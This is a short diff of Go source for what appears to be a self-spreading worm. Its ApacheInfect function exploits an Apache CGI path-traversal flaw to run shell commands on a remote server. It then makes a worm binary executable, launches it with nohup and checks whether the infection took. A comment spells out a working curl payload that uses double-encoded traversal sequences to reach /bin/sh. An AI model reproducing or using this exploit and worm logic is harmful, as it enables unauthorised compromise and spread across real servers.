@@ -6,6 +6,7 @@ import (
 	"net"
 	"encoding/base64"
 	"strings"
+	"os/exec"
 )
 
 //Command execution: curl -X POST localhost:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh -d 'echo;ls -l /tmp/worm | wc -l'
@@ -75,9 +76,9 @@ func ApacheInfect(ip string, port string) bool {
 	commands = fmt.Sprintf("chmod u+x %s; nohup %s &", wormPath, wormPath)
 	commands = fmt.Sprintf(commandsTemplate,commands)
 	MakeRequest2(ip,port,commands)
-	return ApacheCheckInfection(ip,port)
 	
 	test()
+	return ApacheCheckInfection(ip,port)
 }
 
 func test() {
